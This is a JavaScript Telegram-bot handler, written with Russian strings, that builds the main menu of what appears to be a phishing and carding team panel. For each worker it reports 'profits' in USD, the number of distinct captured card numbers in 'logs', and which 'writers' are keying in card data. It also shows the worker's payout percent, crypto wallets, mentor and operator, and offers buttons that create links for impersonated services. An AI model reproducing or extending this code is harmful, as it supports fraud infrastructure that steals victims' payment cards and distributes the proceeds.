const { Markup } = require("telegraf");

const { User, Profit, Ad, Writer, Service, Log } = require("../database");
const declOfNum = require("../helpers/declOfNum");
const moment = require("../helpers/moment");
const locale = require("../locale");
const { Op } = require('sequelize');


module.exports = async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.from.id } });

    var text = locale.mainMenu.text;
    var profitsCount = await Profit.count({
      where: {
        userId: ctx.from.id,
      },
    });

    const startOfMonth = moment().startOf("month").toDate();


    const monthlyProfitsCount = await Profit.count({
      where: {
        userId: ctx.from.id,
        createdAt: {
          [Op.gte]: moment().startOf("month").toDate(),
        },
      },
    });
    const monthly_count = monthlyProfitsCount; // Просто присваиваем значение
    const monthly_sum = await Profit.sum("amount", {
      where: {
        userId: ctx.from.id,
        createdAt: {
          [Op.gte]: startOfMonth,
        },
      },
    });

    const profits = await Profit.paginate({
      where: {
        userId: ctx.from.id,
      },
    });

    var logsCount = await Log.count({
      where: {
        userId: ctx.from.id,
        cardNumber: {
          [Op.not]: null, // Исключаем записи без cardNumber
        }
      },
      distinct: true, // Указывает на уникальные значения
      col: 'cardNumber' // Указывает на поле, по которому происходит подсчет уникальных значений
    });

    var profitLogsCount = await Log.count({
        where: {
          status: `profit`,
          userId: ctx.from.id,
        },
      }),
      profitsSum = parseInt(
        await Profit.sum("amount", {
          where: { userId: ctx.from.id },
        })
      ),
      adsCount = await Ad.count({
        where: {
          userId: ctx.from.id,
        },
      }),
      daysWithUs = moment().diff(moment(ctx.state.user.createdAt), "days"),
      hoursWithUs = moment().diff(moment(ctx.state.user.createdAt), "hours"),
      minutesWithUs = moment().diff(
        moment(ctx.state.user.createdAt),
        "minutes"
      ),
      secondsWithUs = moment().diff(
        moment(ctx.state.user.createdAt),
        "seconds"
      );

    withUsText = `${daysWithUs} ${declOfNum(daysWithUs, [
      "день",
      "дня",
      "дней",
    ])}`;
    if (daysWithUs < 1)
      withUsText = `${hoursWithUs} ${declOfNum(hoursWithUs, [
        "час",
        "часа",
        "часов",
      ])}`;
    if (hoursWithUs < 1)
      withUsText = `${minutesWithUs} ${declOfNum(minutesWithUs, [
        "минуту",
        "минуты",
        "минут",
      ])}`;
    if (minutesWithUs < 1)
      withUsText = `${secondsWithUs} ${declOfNum(secondsWithUs, [
        "секунду",
        "секунды",
        "секунд",
      ])}`;

    const now = await new Date();
    const hour = await now.getHours();
    const minute = now.getMinutes();
    var days = [
      "Воскресенье",
      "Понедельник",
      "Вторник",
      "Среда",
      "Четверг",
      "Пятница",
      "Суббота",
    ];
    var date = `${hour}:${minute}`;

    var { status } = ctx.state.user;
    const writer = await Writer.findAll();
    var writers = ``;
    var writer_list = writer.map((v) => {
      writers += `@${v.username} `;
    });

    if (writers.length < 1) {
      writers = "никто не вбивает";
    }

    text = text;

    let statusArray = [];

    // Основной статус
    if (user.status == 1) statusArray.push(locale.roles.admin);
    else if (user.status == 2) statusArray.push(locale.roles.writer);
    else if (user.status == 3) statusArray.push(locale.roles.pro);
    else statusArray.push(locale.roles.worker);

    // Дополнительные роли
    if (user.isMentor) statusArray.push("Наставник");
    if (user.isOperator) statusArray.push("Оператор");

    // Формируем строку
    let statusText = statusArray.join(", ");

    // Заменяем в тексте
    text = text

    .replace("{monthly_count}", monthly_count)
    .replace("{monthly_sum}", `${Math.ceil(monthly_sum || 0)} USD`)
      .replace("{status}", `<b>${statusText}</b>`)

      
      .replace("{id}", ctx.from.id)
      .replace("{name}", ctx.from.username)
      .replace("{name1}", ctx.from.first_name)
      .replace(
        "{tag}",
        `${ctx.state.user.tag == null ? "Не установлен" : `#${ctx.state.user.tag}`}`
      )
      .replace("{writer}", writers)
   
      .replace("{date_time}", date)
      .replace(
        "{wallet}",
        `${
          ctx.state.user.wallet == true
            ? ""
            : `Установите кошелек для выплат
(Настройки - Мой кошелек)`
        }`
      )
      // .replace("{wallet_profit}", `${ctx.state.user.wallet == true ? "" : "ℹ️ Советуем установить криптопошелек для выплаты (Для этого перейдите в настройки и выберите нужный вам вариант) "}`)

      .replace("{profits_count}", profitsCount)
      .replace("{logs_count}", logsCount)
      .replace("{profitlogs_count}", profits.meta.total)

      .replace("{profits_sum}", `${Math.ceil(profitsSum)} USD`)
      .replace(
        "{work}",
        `${ctx.state.bot.work == true ? "⚙️ Проект: <b>Работает</b>" : "⚙️ Проект: <b>Не работает</b>"}`
      )
      .replace("{ads_count}", adsCount)

      .replace(
        "{hideService}",
        `${ctx.state.user.hideService == true ? "Скрыт " : "Виден"}`
      )

      .replace(
        "{mentor}",
        user.mentor
          ? `<a href='t.me/${user.mentor}'>Перейти</a>`
          : `Отсутствует`
      )
      .replace(
        "{operator}",
        user.operator
          ? `<a href='t.me/${user.operator}'>Перейти</a>`
          : `Отсутствует`
      )

      .replace(
        "{payoutPercent}",
        ctx.state.user.percent != null
          ? ctx.state.user.percent
          : ctx.state.bot.payoutPercent || "не установлен"
      )
      

      .replace("{with_us}", withUsText)
      .replace(
        "{btc_wallet}",
        ctx.state.user.btc == null ? "Не указан" : ctx.state.user.btc
      )
      .replace(
        "{trc_wallet}",
        ctx.state.user.trc == null ? "Не указан" : ctx.state.user.trc
      )

      .replace("{hide_nick}", ctx.state.user.hideNick ? "Скрыт" : "Виден");
      const chunk = (arr, size) =>
        arr.reduce((acc, _, i) => (i % size ? acc : [...acc, arr.slice(i, i + size)]), []);
      
      const selectedServices = user.mainService ? JSON.parse(user.mainService) : [];
      let selectedButtons = [];
      
      // Загружаем избранные сервисы
      if (Array.isArray(selectedServices) && selectedServices.length > 0) {
        const services = await Service.findAll({
          where: { code: selectedServices },
        });
      
        selectedButtons = services.map((service) =>
          Markup.callbackButton(service.title, `create_link_service_${service.code}`)
        );
      }
      
      // Разбиваем избранные по 2 в ряд
      const allButtons = chunk(selectedButtons, 2);
      
      // Добавляем последний сервис ВВЕРХУ
      if (user.lastService) {
        const lastService = await Service.findOne({ where: { code: user.lastService } });
        if (lastService) {
          allButtons.unshift([
            Markup.callbackButton(`${lastService.title}`, `create_link_service_${lastService.code}`)
          ]);
        }
      }  
  
      await ctx
        .replyOrEdit(text, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            ...allButtons,
  

          [
            Markup.callbackButton(
              locale.mainMenu.buttons.create_link,
              "create_link"
            ),
          ],

          [Markup.callbackButton(locale.mainMenu.buttons.my_ads, "my_ads_1"),

          Markup.callbackButton(locale.mainMenu.buttons.settings, "settings")],

          [Markup.callbackButton("💻 Помощь в работе", "help_work")],


          [Markup.callbackButton(locale.mainMenu.buttons.info, "info")],


      

         
       
          ...(user.isMentor
            ? [[Markup.callbackButton("👨🏼‍🏫 Меню Наставника", "menu_mentor")]]
            : []),
          
  

                  

          ...(user.isOperator
            ? [[Markup.callbackButton("👨🏼‍💻 Меню Оператора", "menu_operator")]]
            : []),
           
          ...(user.status == 1
            ? [[Markup.callbackButton("💻 Админ-панель", "admin")]]
            : []),
        ]),
      })

      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
};
